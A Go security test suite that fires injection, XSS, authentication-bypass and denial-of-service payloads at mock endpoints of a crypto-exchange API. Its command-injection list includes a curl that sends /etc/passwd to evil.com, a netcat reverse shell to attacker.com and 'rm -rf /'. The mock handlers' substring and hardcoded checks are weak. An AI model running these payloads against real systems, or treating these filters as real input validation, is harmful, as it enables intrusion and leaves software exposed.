package penetration

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/suite"
)

// PenetrationTestSuite contains comprehensive security testing scenarios
type PenetrationTestSuite struct {
	suite.Suite
	router *gin.Engine
	server *httptest.Server
	client *http.Client
}

// SetupSuite initializes the test environment
func (suite *PenetrationTestSuite) SetupSuite() {
	gin.SetMode(gin.TestMode)
	suite.router = gin.New()
	suite.setupRoutes()
	suite.server = httptest.NewServer(suite.router)
	suite.client = &http.Client{
		Timeout: 10 * time.Second,
	}
}

// TearDownSuite cleans up the test environment
func (suite *PenetrationTestSuite) TearDownSuite() {
	if suite.server != nil {
		suite.server.Close()
	}
}

// setupRoutes creates mock API endpoints for testing
func (suite *PenetrationTestSuite) setupRoutes() {
	// Authentication endpoints
	suite.router.POST("/api/v1/auth/login", suite.mockAuthHandler)
	suite.router.POST("/api/v1/auth/refresh", suite.mockRefreshHandler)
	
	// DEX endpoints
	suite.router.GET("/api/v1/tokens", suite.mockTokensHandler)
	suite.router.POST("/api/v1/swap", suite.mockSwapHandler)
	suite.router.GET("/api/v1/pools", suite.mockPoolsHandler)
	suite.router.POST("/api/v1/liquidity", suite.mockLiquidityHandler)
	
	// Admin endpoints
	suite.router.POST("/api/v1/admin/pools", suite.mockAdminHandler)
	suite.router.DELETE("/api/v1/admin/pools/:id", suite.mockAdminHandler)
	
	// File upload endpoint
	suite.router.POST("/api/v1/upload", suite.mockUploadHandler)
}

// ============ INJECTION ATTACK TESTS ============

func (suite *PenetrationTestSuite) TestSQLInjectionAttacks() {
	sqlInjectionPayloads := []string{
		"'; DROP TABLE users; --",
		"' OR '1'='1",
		"'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
		"' UNION SELECT * FROM sensitive_data --",
		"'; UPDATE users SET password='hacked' WHERE id=1; --",
		"' OR 1=1 LIMIT 1 OFFSET 1 --",
		"'; EXEC xp_cmdshell('dir'); --",
		"' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
	}

	for _, payload := range sqlInjectionPayloads {
		suite.Run(fmt.Sprintf("SQL_Injection_%s", payload), func() {
			// Test in query parameters
			resp, err := suite.client.Get(fmt.Sprintf("%s/api/v1/tokens?search=%s", suite.server.URL, payload))
			assert.NoError(suite.T(), err)
			assert.Equal(suite.T(), http.StatusBadRequest, resp.StatusCode, "Should reject SQL injection in query")
			resp.Body.Close()

			// Test in JSON body
			swapData := map[string]interface{}{
				"tokenIn":  payload,
				"tokenOut": "0x742d35Cc6634C0532925a3b8D4C9db96",
				"amount":   "1000",
			}
			jsonData, _ := json.Marshal(swapData)
			resp, err = suite.client.Post(fmt.Sprintf("%s/api/v1/swap", suite.server.URL), "application/json", bytes.NewBuffer(jsonData))
			assert.NoError(suite.T(), err)
			assert.Equal(suite.T(), http.StatusBadRequest, resp.StatusCode, "Should reject SQL injection in JSON")
			resp.Body.Close()
		})
	}
}

func (suite *PenetrationTestSuite) TestXSSAttacks() {
	xssPayloads := []string{
		"<script>alert('XSS')</script>",
		"javascript:alert('XSS')",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert('XSS')>",
		"';alert('XSS');//",
		"\"><script>alert('XSS')</script>",
		"<iframe src=javascript:alert('XSS')></iframe>",
		"<body onload=alert('XSS')>",
	}

	for _, payload := range xssPayloads {
		suite.Run(fmt.Sprintf("XSS_Attack_%s", payload), func() {
			// Test in various endpoints
			resp, err := suite.client.Get(fmt.Sprintf("%s/api/v1/tokens?name=%s", suite.server.URL, payload))
			assert.NoError(suite.T(), err)
			assert.Equal(suite.T(), http.StatusBadRequest, resp.StatusCode, "Should reject XSS payload")
			resp.Body.Close()
		})
	}
}

func (suite *PenetrationTestSuite) TestCommandInjectionAttacks() {
	cmdInjectionPayloads := []string{
		"; ls -la",
		"| cat /etc/passwd",
		"&& rm -rf /",
		"`whoami`",
		"$(id)",
		"; curl http://evil.com/steal?data=$(cat /etc/passwd)",
		"| nc -e /bin/sh attacker.com 4444",
	}

	for _, payload := range cmdInjectionPayloads {
		suite.Run(fmt.Sprintf("CMD_Injection_%s", payload), func() {
			uploadData := map[string]interface{}{
				"filename": payload,
				"content":  "test content",
			}
			jsonData, _ := json.Marshal(uploadData)
			resp, err := suite.client.Post(fmt.Sprintf("%s/api/v1/upload", suite.server.URL), "application/json", bytes.NewBuffer(jsonData))
			assert.NoError(suite.T(), err)
			assert.Equal(suite.T(), http.StatusBadRequest, resp.StatusCode, "Should reject command injection")
			resp.Body.Close()
		})
	}
}

// ============ AUTHENTICATION BYPASS TESTS ============

func (suite *PenetrationTestSuite) TestAuthenticationBypass() {
	// Test various authentication bypass techniques
	bypassAttempts := []struct {
		name   string
		header map[string]string
		body   map[string]interface{}
	}{
		{
			name: "JWT_None_Algorithm",
			header: map[string]string{
				"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
			},
		},
		{
			name: "SQL_Auth_Bypass",
			body: map[string]interface{}{
				"username": "admin' --",
				"password": "anything",
			},
		},
		{
			name: "NoSQL_Injection",
			body: map[string]interface{}{
				"username": map[string]string{"$ne": ""},
				"password": map[string]string{"$ne": ""},
			},
		},
		{
			name: "Header_Injection",
			header: map[string]string{
				"X-Forwarded-For": "127.0.0.1",
				"X-Real-IP":       "127.0.0.1",
				"X-Originating-IP": "127.0.0.1",
			},
		},
	}

	for _, attempt := range bypassAttempts {
		suite.Run(attempt.name, func() {
			var req *http.Request
			var err error

			if attempt.body != nil {
				jsonData, _ := json.Marshal(attempt.body)
				req, err = http.NewRequest("POST", fmt.Sprintf("%s/api/v1/auth/login", suite.server.URL), bytes.NewBuffer(jsonData))
				req.Header.Set("Content-Type", "application/json")
			} else {
				req, err = http.NewRequest("GET", fmt.Sprintf("%s/api/v1/admin/pools", suite.server.URL), nil)
			}

			assert.NoError(suite.T(), err)

			// Add custom headers
			for key, value := range attempt.header {
				req.Header.Set(key, value)
			}

			resp, err := suite.client.Do(req)
			assert.NoError(suite.T(), err)
			assert.NotEqual(suite.T(), http.StatusOK, resp.StatusCode, "Authentication bypass should be prevented")
			resp.Body.Close()
		})
	}
}

// ============ RATE LIMITING AND DOS TESTS ============

func (suite *PenetrationTestSuite) TestRateLimitingBypass() {
	// Test rate limiting bypass techniques
	bypassHeaders := []map[string]string{
		{"X-Forwarded-For": "192.168.1.1"},
		{"X-Real-IP": "10.0.0.1"},
		{"X-Originating-IP": "172.16.0.1"},
		{"X-Cluster-Client-IP": "203.0.113.1"},
		{"CF-Connecting-IP": "198.51.100.1"},
		{"True-Client-IP": "203.0.113.2"},
	}

	for i, headers := range bypassHeaders {
		suite.Run(fmt.Sprintf("Rate_Limit_Bypass_%d", i), func() {
			// Send multiple requests rapidly
			for j := 0; j < 100; j++ {
				req, err := http.NewRequest("GET", fmt.Sprintf("%s/api/v1/tokens", suite.server.URL), nil)
				assert.NoError(suite.T(), err)

				// Add bypass headers
				for key, value := range headers {
					req.Header.Set(key, fmt.Sprintf("%s.%d", value, j))
				}

				resp, err := suite.client.Do(req)
				assert.NoError(suite.T(), err)
				resp.Body.Close()

				// After some requests, should be rate limited
				if j > 50 {
					assert.Equal(suite.T(), http.StatusTooManyRequests, resp.StatusCode, "Should be rate limited")
					break
				}
			}
		})
	}
}

func (suite *PenetrationTestSuite) TestDenialOfServiceAttacks() {
	// Test various DoS attack vectors
	dosTests := []struct {
		name string
		test func()
	}{
		{
			name: "Large_Payload_Attack",
			test: func() {
				// Create extremely large payload
				largeData := make([]byte, 10*1024*1024) // 10MB
				rand.Read(largeData)

				resp, err := suite.client.Post(
					fmt.Sprintf("%s/api/v1/swap", suite.server.URL),
					"application/json",
					bytes.NewBuffer(largeData),
				)
				assert.NoError(suite.T(), err)
				assert.Equal(suite.T(), http.StatusRequestEntityTooLarge, resp.StatusCode)
				resp.Body.Close()
			},
		},
		{
			name: "Slowloris_Attack",
			test: func() {
				// Simulate slow HTTP attack
				ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
				defer cancel()

				req, err := http.NewRequestWithContext(ctx, "POST", fmt.Sprintf("%s/api/v1/swap", suite.server.URL), strings.NewReader("{\"slow\": \""))
				assert.NoError(suite.T(), err)
				req.Header.Set("Content-Type", "application/json")

				resp, err := suite.client.Do(req)
				// Should timeout or be rejected
				if err == nil {
					assert.NotEqual(suite.T(), http.StatusOK, resp.StatusCode)
					resp.Body.Close()
				}
			},
		},
		{
			name: "Recursive_JSON_Attack",
			test: func() {
				// Create deeply nested JSON to cause stack overflow
				nestedJSON := strings.Repeat("{\"nested\":", 10000) + "\"value\"" + strings.Repeat("}", 10000)

				resp, err := suite.client.Post(
					fmt.Sprintf("%s/api/v1/swap", suite.server.URL),
					"application/json",
					strings.NewReader(nestedJSON),
				)
				assert.NoError(suite.T(), err)
				assert.Equal(suite.T(), http.StatusBadRequest, resp.StatusCode)
				resp.Body.Close()
			},
		},
	}

	for _, test := range dosTests {
		suite.Run(test.name, test.test)
	}
}

// ============ BUSINESS LOGIC TESTS ============

func (suite *PenetrationTestSuite) TestBusinessLogicFlaws() {
	// Test for business logic vulnerabilities
	businessLogicTests := []struct {
		name string
		test func()
	}{
		{
			name: "Negative_Amount_Swap",
			test: func() {
				swapData := map[string]interface{}{
					"tokenIn":  "0x742d35Cc6634C0532925a3b8D4C9db96",
					"tokenOut": "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
					"amount":   "-1000", // Negative amount
				}
				jsonData, _ := json.Marshal(swapData)
				resp, err := suite.client.Post(fmt.Sprintf("%s/api/v1/swap", suite.server.URL), "application/json", bytes.NewBuffer(jsonData))
				assert.NoError(suite.T(), err)
				assert.Equal(suite.T(), http.StatusBadRequest, resp.StatusCode)
				resp.Body.Close()
			},
		},
		{
			name: "Zero_Amount_Swap",
			test: func() {
				swapData := map[string]interface{}{
					"tokenIn":  "0x742d35Cc6634C0532925a3b8D4C9db96",
					"tokenOut": "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
					"amount":   "0", // Zero amount
				}
				jsonData, _ := json.Marshal(swapData)
				resp, err := suite.client.Post(fmt.Sprintf("%s/api/v1/swap", suite.server.URL), "application/json", bytes.NewBuffer(jsonData))
				assert.NoError(suite.T(), err)
				assert.Equal(suite.T(), http.StatusBadRequest, resp.StatusCode)
				resp.Body.Close()
			},
		},
		{
			name: "Same_Token_Swap",
			test: func() {
				swapData := map[string]interface{}{
					"tokenIn":  "0x742d35Cc6634C0532925a3b8D4C9db96",
					"tokenOut": "0x742d35Cc6634C0532925a3b8D4C9db96", // Same token
					"amount":   "1000",
				}
				jsonData, _ := json.Marshal(swapData)
				resp, err := suite.client.Post(fmt.Sprintf("%s/api/v1/swap", suite.server.URL), "application/json", bytes.NewBuffer(jsonData))
				assert.NoError(suite.T(), err)
				assert.Equal(suite.T(), http.StatusBadRequest, resp.StatusCode)
				resp.Body.Close()
			},
		},
	}

	for _, test := range businessLogicTests {
		suite.Run(test.name, test.test)
	}
}

// ============ MOCK HANDLERS ============

func (suite *PenetrationTestSuite) mockAuthHandler(c *gin.Context) {
	var loginData map[string]interface{}
	if err := c.ShouldBindJSON(&loginData); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
		return
	}

	// Basic validation to prevent injection
	username, ok := loginData["username"].(string)
	if !ok || strings.Contains(username, "'") || strings.Contains(username, "--") {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid username"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"token": "mock-token"})
}

func (suite *PenetrationTestSuite) mockRefreshHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"token": "new-mock-token"})
}

func (suite *PenetrationTestSuite) mockTokensHandler(c *gin.Context) {
	// Validate query parameters
	search := c.Query("search")
	name := c.Query("name")
	
	// Check for XSS and injection attempts
	if strings.Contains(search, "<script>") || strings.Contains(search, "'") ||
	   strings.Contains(name, "<script>") || strings.Contains(name, "javascript:") {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid input"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"tokens": []string{"ETH", "USDC"}})
}

func (suite *PenetrationTestSuite) mockSwapHandler(c *gin.Context) {
	var swapData map[string]interface{}
	if err := c.ShouldBindJSON(&swapData); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
		return
	}

	// Validate swap data
	tokenIn, _ := swapData["tokenIn"].(string)
	tokenOut, _ := swapData["tokenOut"].(string)
	amount, _ := swapData["amount"].(string)

	// Basic validation
	if tokenIn == tokenOut {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Cannot swap same token"})
		return
	}

	if amount == "0" || amount == "-1000" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid amount"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"success": true})
}

func (suite *PenetrationTestSuite) mockPoolsHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"pools": []string{"ETH/USDC", "WBTC/ETH"}})
}

func (suite *PenetrationTestSuite) mockLiquidityHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"success": true})
}

func (suite *PenetrationTestSuite) mockAdminHandler(c *gin.Context) {
	// Should require authentication
	auth := c.GetHeader("Authorization")
	if auth == "" {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Unauthorized"})
		return
	}

	// Check for bypass attempts
	if strings.Contains(auth, "none") {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid token"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"success": true})
}

func (suite *PenetrationTestSuite) mockUploadHandler(c *gin.Context) {
	var uploadData map[string]interface{}
	if err := c.ShouldBindJSON(&uploadData); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
		return
	}

	filename, _ := uploadData["filename"].(string)
	
	// Check for command injection
	if strings.Contains(filename, ";") || strings.Contains(filename, "|") || 
	   strings.Contains(filename, "&") || strings.Contains(filename, "`") {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid filename"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"success": true})
}

// TestPenetrationTestSuite runs the penetration test suite
func TestPenetrationTestSuite(t *testing.T) {
	suite.Run(t, new(PenetrationTestSuite))
}